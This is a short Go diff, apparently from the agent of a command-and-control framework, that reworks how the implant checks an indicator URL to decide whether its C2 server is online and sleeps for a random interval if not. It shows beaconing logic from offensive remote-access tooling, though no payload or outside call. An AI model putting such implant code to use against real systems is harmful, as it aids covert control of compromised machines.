@@ -284,10 +284,8 @@ connect:
 
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
-		agent.RuntimeConfig.CCIndicator != "" &&
-		agent.RuntimeConfig.CCIndicatorText != "" { // check indicator URL or not
-
-		if !agent.IsCCOnline(agent.RuntimeConfig.C2TransportProxy) {
+		agent.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
+		if !agent.ConditionalC2Yes(agent.RuntimeConfig.C2TransportProxy) {
 			log.Println("CC not online")
 			time.Sleep(time.Duration(
 				util.RandInt(
